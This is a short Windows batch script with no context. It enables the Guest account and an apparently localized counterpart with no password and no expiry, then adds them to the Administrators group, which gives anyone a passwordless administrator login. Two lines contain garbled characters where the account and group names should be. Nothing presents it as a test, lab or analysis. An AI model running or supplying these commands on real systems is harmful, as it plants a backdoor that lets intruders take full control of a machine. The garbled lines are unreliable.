@net user ����� /ACTIVE:YES /EXPIRES:NEVER /PASSWORDREQ:no /WORKSTATIONS:*
@net localgroup ������������ /add �����
@net user Guest /ACTIVE:YES /EXPIRES:NEVER /PASSWORDREQ:no /WORKSTATIONS:*
@net localgroup Administrators /add Guest
exit